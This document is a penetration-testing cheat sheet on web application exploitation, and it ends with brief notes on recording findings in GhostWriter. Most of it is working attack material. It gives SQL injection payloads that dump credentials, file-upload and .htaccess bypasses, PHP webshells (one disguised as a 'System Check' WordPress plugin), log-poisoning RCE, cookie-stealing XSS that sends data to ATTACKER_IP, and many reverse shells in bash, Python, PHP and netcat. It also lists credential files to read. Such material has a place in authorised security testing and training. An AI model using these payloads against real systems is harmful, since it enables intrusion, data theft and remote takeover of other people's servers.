# Web Application Exploitation

## SQL Injection Exploitation

### Manual Testing

**Error-Based Detection:**
```bash
# Test for SQL injection
curl "http://TARGET/page.php?id=1'"
curl "http://TARGET/page.php?id=1' OR '1'='1"
curl "http://TARGET/page.php?id=1' AND '1'='2"
```

**Determine Column Count:**
```bash
# ORDER BY method
curl "http://TARGET/page.php?id=1' ORDER BY 1-- -"
curl "http://TARGET/page.php?id=1' ORDER BY 2-- -"
curl "http://TARGET/page.php?id=1' ORDER BY 3-- -"
# Continue until error
```

**Find Displayed Columns:**
```bash
# UNION SELECT with NULL
curl "http://TARGET/page.php?id=1' UNION SELECT NULL,NULL,NULL-- -"

# Replace NULL with numbers to find which display
curl "http://TARGET/page.php?id=1' UNION SELECT 1,2,3-- -"
```

**Extract Database Information (MySQL):**
```bash
# Database version and user
curl "http://TARGET/page.php?id=1' UNION SELECT 1,version(),user()-- -"

# Database name
curl "http://TARGET/page.php?id=1' UNION SELECT 1,database(),3-- -"

# List tables
curl "http://TARGET/page.php?id=1' UNION SELECT 1,table_name,3 FROM information_schema.tables WHERE table_schema=database()-- -"

# List columns in users table
curl "http://TARGET/page.php?id=1' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'-- -"

# Extract user credentials
curl "http://TARGET/page.php?id=1' UNION SELECT 1,CONCAT(username,':',password),3 FROM users-- -"
```

**Extract Database Information (MSSQL):**
```bash
# Database version
curl "http://TARGET/page.php?id=1' UNION SELECT 1,@@version,3-- "

# List databases
curl "http://TARGET/page.php?id=1' UNION SELECT 1,name,3 FROM sys.databases-- "

# List tables
curl "http://TARGET/page.php?id=1' UNION SELECT 1,name,3 FROM sys.tables-- "

# Command execution (if xp_cmdshell enabled)
curl "http://TARGET/page.php?id=1'; EXEC xp_cmdshell 'whoami'-- "
```

### sqlmap

```bash
# Basic database enumeration
sqlmap -u "http://TARGET/page.php?id=1" --batch --dbs

# Dump specific database
sqlmap -u "http://TARGET/page.php?id=1" -D database_name --tables --batch

# Dump specific table
sqlmap -u "http://TARGET/page.php?id=1" -D database_name -T users --dump --batch

# With authentication
sqlmap -u "http://TARGET/page.php?id=1" --cookie="session=abc123" --batch --dbs

# POST parameter
sqlmap -u "http://TARGET/login.php" --data="username=admin&password=test" -p username --batch

# Get OS shell (MSSQL with xp_cmdshell)
sqlmap -u "http://TARGET/page.php?id=1" --os-shell
```

## File Upload Exploitation

### Extension Bypass Techniques

```bash
# Test file upload with different extensions
shell.php
shell.php5
shell.phtml
shell.phar
shell.PhP          # Case variation
shell.jpg.php      # Double extension
shell.php.jpg      # Reverse double
shell.php%00.jpg   # Null byte (older systems)
shell.php%0a.jpg   # Newline
shell.php;.jpg     # Semicolon
shell.php%20.jpg   # Space
```

### Magic Bytes (Content-Type Bypass)

**PHP webshell with image magic bytes:**
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

**Upload with image Content-Type:**
```bash
# Using curl
curl -X POST http://TARGET/upload.php \
  -H "Content-Type: multipart/form-data" \
  -F "file=@shell.php;type=image/jpeg"
```

### .htaccess Injection

**If you can upload .htaccess:**
```apache
AddType application/x-httpd-php .jpg
```

**Then upload shell as .jpg:**
```bash
# Upload .htaccess first
curl -X POST http://TARGET/upload.php -F "file=@.htaccess"

# Then upload PHP code as .jpg
curl -X POST http://TARGET/upload.php -F "file=@shell.jpg"

# Access: http://TARGET/uploads/shell.jpg
```

### Finding Upload Location

```bash
# Common upload directories
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,jpg,txt

# Check common paths
curl http://TARGET/uploads/
curl http://TARGET/files/
curl http://TARGET/images/
curl http://TARGET/assets/uploads/
curl http://TARGET/media/
```

## Local/Remote File Inclusion (LFI/RFI)

### LFI Testing

```bash
# Basic LFI
curl "http://TARGET/page.php?file=../../../../etc/passwd"

# Wrapper protocols
curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=index.php"
curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=../config.php"

# Decode base64 output
echo "BASE64_OUTPUT" | base64 -d
```

### LFI to RCE

**Log Poisoning:**
```bash
# 1. Poison access log with PHP code
nc TARGET 80
GET /<?php system($_GET['cmd']); ?> HTTP/1.1

# 2. Include poisoned log via LFI
curl "http://TARGET/page.php?file=../../../../var/log/apache2/access.log&cmd=id"

# Common log locations
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/httpd/access_log
```

**Session File Inclusion:**
```bash
# 1. Set session variable to PHP code
curl "http://TARGET/session.php" --cookie "PHPSESSID=malicious" --data "name=<?php system(\$_GET['cmd']); ?>"

# 2. Include session file
curl "http://TARGET/page.php?file=../../../../var/lib/php/sessions/sess_malicious&cmd=id"
```

**Combine with File Upload:**
```bash
# 1. Upload file with PHP code (even if filtered)
# File: image.jpg containing <?php system($_GET['cmd']); ?>

# 2. Include via LFI
curl "http://TARGET/page.php?file=../../../../uploads/image.jpg&cmd=id"
```

### RFI (If enabled)

```bash
# Host shell on your server
echo '<?php system($_GET["cmd"]); ?>' > shell.txt
python3 -m http.server 80

# Include remote file
curl "http://TARGET/page.php?file=http://ATTACKER_IP/shell.txt&cmd=id"
```

## Cross-Site Scripting (XSS)

### Reflected XSS

```bash
# Basic test
curl "http://TARGET/search?q=<script>alert(1)</script>"

# Bypass filters
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
```

### Stored XSS

```bash
# Submit in form/comment field
<script>fetch('http://ATTACKER_IP/steal?cookie='+document.cookie)</script>

# Alternative payloads
<img src=x onerror="fetch('http://ATTACKER_IP/'+document.cookie)">
```

### XSS to Session Hijacking

```bash
# 1. Set up listener
nc -lvnp 80

# 2. Inject payload
<script>
document.location='http://ATTACKER_IP/?cookie='+document.cookie
</script>

# 3. Receive cookie and use for authentication
```

## Authentication Bypass

### SQL Injection Auth Bypass

```bash
# Login bypass payloads
username: admin' OR '1'='1'-- -
password: anything

username: admin'--
password: (leave blank)

username: ' OR 1=1-- -
password: ' OR 1=1-- -
```

### Default Credentials

```bash
# Common web app defaults
admin:admin
admin:password
administrator:administrator
root:root
test:test

# CMS-specific
# WordPress: admin:admin
# Tomcat: tomcat:tomcat, admin:admin
# Jenkins: admin:password, jenkins:jenkins
```

## Command Injection

### Basic Testing

```bash
# Test for OS command injection
curl "http://TARGET/ping.php?ip=127.0.0.1;id"
curl "http://TARGET/ping.php?ip=127.0.0.1|whoami"
curl "http://TARGET/ping.php?ip=127.0.0.1\`whoami\`"
curl "http://TARGET/ping.php?ip=127.0.0.1%26%26whoami"  # URL encoded &&
```

### Getting Shell from Command Injection

```bash
# 1. Start listener
nc -lvnp 4444

# 2. Inject reverse shell
# Bash reverse shell
curl "http://TARGET/page.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"

# Python reverse shell
curl "http://TARGET/page.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ATTACKER_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
```

## Server-Side Request Forgery (SSRF)

### Basic SSRF Testing

```bash
# Test for SSRF
curl -X POST http://TARGET/fetch.php -d "url=http://127.0.0.1"
curl -X POST http://TARGET/fetch.php -d "url=http://localhost"
```

### SSRF to RCE

```bash
# Scan internal network

# Access internal services
curl "http://TARGET/fetch.php?url=http://localhost:8080"  # Internal Tomcat?
curl "http://TARGET/fetch.php?url=http://localhost:3306"  # MySQL?
curl "http://TARGET/fetch.php?url=http://localhost:6379"  # Redis?
```

## XML External Entity (XXE)

### XXE Testing

```bash
# Create XXE payload
cat > xxe.xml << 'EOF'
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>
EOF

# Send payload
curl -X POST http://TARGET/upload.xml \
  -H "Content-Type: application/xml" \
  -d @xxe.xml
```

### XXE to RCE (Expect)

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<foo>&xxe;</foo>
```

## WordPress Exploitation

### After Getting Admin Access

**Method 1: Plugin Upload**
```bash
# Create malicious plugin
cat > shell.php << 'EOF'
<?php
/**
 * Plugin Name: System Check
 * Version: 1.0
 */
if(isset($_GET['cmd'])) { system($_GET['cmd']); }
?>
EOF

# Zip it
zip shell.zip shell.php

# Upload via WordPress admin:
# Plugins → Add New → Upload Plugin → Choose shell.zip → Install → Activate

# Execute commands
curl "http://TARGET/wp-content/plugins/shell/shell.php?cmd=id"
```

**Method 2: Theme Editor**
```bash
# Navigate to: Appearance → Theme Editor
# Edit 404.php or any template
# Add at top: <?php system($_GET['cmd']); ?>

# Access
curl "http://TARGET/wp-content/themes/THEME_NAME/404.php?cmd=id"
```

**Method 3: Plugin Vulnerabilities**
```bash
# Scan for vulnerable plugins
wpscan --url http://TARGET --enumerate vp --api-token YOUR_TOKEN

# Search for exploits
searchsploit wordpress PLUGIN_NAME
```

## Getting Shells

### Reverse Shell Payloads

**Bash:**
```bash
bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'
```

**Python:**
```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**PHP:**
```php
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"); ?>
```

**Netcat:**
```bash
nc -e /bin/bash ATTACKER_IP 4444
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### Web Shell Payloads

**Simple PHP Shell:**
```php
<?php system($_GET['cmd']); ?>
```

**More Features:**
```php
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

**Upload via SQL injection:**
```sql
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

## Insecure Deserialization

### PHP Deserialization

```bash
# If you control serialized data
# Create payload with phpggc
phpggc -l  # List gadgets

# Generate payload
phpggc Symfony/RCE4 system id | base64

# Send in cookie/POST data
curl http://TARGET --cookie "data=SERIALIZED_PAYLOAD"
```

## Directory Traversal / Path Traversal

### Testing

```bash
# Basic traversal
curl "http://TARGET/download.php?file=../../../../etc/passwd"

# URL encoding
curl "http://TARGET/download.php?file=..%2f..%2f..%2f..%2fetc%2fpasswd"

# Double encoding
curl "http://TARGET/download.php?file=..%252f..%252f..%252f..%252fetc%252fpasswd"

# Different separators
curl "http://TARGET/download.php?file=....//....//....//....//etc/passwd"
```

### Interesting Files to Extract

```bash
# Linux
/etc/passwd
/etc/shadow
/home/user/.ssh/id_rsa
/var/www/html/config.php
/var/log/apache2/access.log

# Windows
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\inetpub\wwwroot\web.config
C:\Users\Administrator\.ssh\id_rsa
```

## Credential Extraction from Web Apps

### Common Config File Locations

```bash
# PHP
/var/www/html/config.php
/var/www/html/wp-config.php
/var/www/html/configuration.php
/var/www/html/includes/config.php

# Download via LFI
curl "http://TARGET/page.php?file=php://filter/convert.base64-encode/resource=config.php" | base64 -d

# Look for database credentials
grep -i "password\|db_pass\|database" config.php
```

### Git Repository Extraction

```bash
# If .git exposed
wget -r http://TARGET/.git/

# Extract using git-dumper
git-dumper http://TARGET/.git/ ./output

# Search for credentials in commits
cd output
git log --all --oneline
git show COMMIT_HASH | grep -i password
```

### .env File Extraction

```bash
# Common .env locations
curl http://TARGET/.env
curl http://TARGET/../.env
curl http://TARGET/api/.env

# Parse for credentials
cat .env | grep -i "password\|secret\|key\|token"
```

## API Exploitation

### REST API Testing

```bash
# Test for broken authentication
curl -X GET http://TARGET/api/users

# Test for IDOR
curl -X GET http://TARGET/api/users/1
curl -X GET http://TARGET/api/users/2  # Try other users

# Test for mass assignment
curl -X POST http://TARGET/api/users \
  -H "Content-Type: application/json" \
  -d '{"username":"hacker","password":"pass","role":"admin"}'

# Test HTTP methods
curl -X DELETE http://TARGET/api/users/1
curl -X PUT http://TARGET/api/users/1 -d '{"role":"admin"}'
```

### GraphQL Exploitation

```bash
# Introspection query
curl http://TARGET/graphql \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __schema { types { name fields { name } } } }"}'

# Query all users if exposed
curl http://TARGET/graphql \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { id username password email } }"}'
```

## Getting Reverse Shells

### Setup Listener

```bash
# Basic netcat
nc -lvnp 4444

# Better with rlwrap (command history)
rlwrap nc -lvnp 4444

# Multi-handler (catches multiple shells)
msfconsole -q -x "use exploit/multi/handler; set payload linux/x64/shell_reverse_tcp; set LHOST ATTACKER_IP; set LPORT 4444; run"
```

### Stabilize Shell

```bash
# Python PTY
python -c 'import pty;pty.spawn("/bin/bash")'
# or
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Background shell with Ctrl+Z, then:
stty raw -echo; fg
export TERM=xterm
export SHELL=/bin/bash

# Resize terminal
stty rows 38 columns 116
```

## One-Liner Exploitation Chains

### SQLi → Database Dump → Cracked Passwords
```bash
sqlmap -u "http://TARGET/page.php?id=1" -D webapp -T users --dump --batch && \
hashcat -m 0 extracted_hashes.txt /usr/share/wordlists/rockyou.txt --force && \
hashcat -m 0 extracted_hashes.txt --show
```

### File Upload → Web Shell → Reverse Shell
```bash
# 1. Upload shell.php with <?php system($_GET['cmd']); ?>
# 2. Test it
curl "http://TARGET/uploads/shell.php?cmd=id"
# 3. Get reverse shell
curl "http://TARGET/uploads/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"
```

## Documentation for GhostWriter

**Create finding immediately when you confirm:**
- SQLi exists (even before full exploitation)
- File upload bypass works
- XSS confirmed (reflected or stored)
- Authentication bypass successful
- Sensitive files accessible

**Evidence to capture:**
- Error messages showing vulnerability
- Successful payload execution
- Extracted data (sanitized for report)
- Database credentials found
- Admin panel access

**Remember:**
- Document the FIRST successful payload
- Screenshot every major step
- Save command history
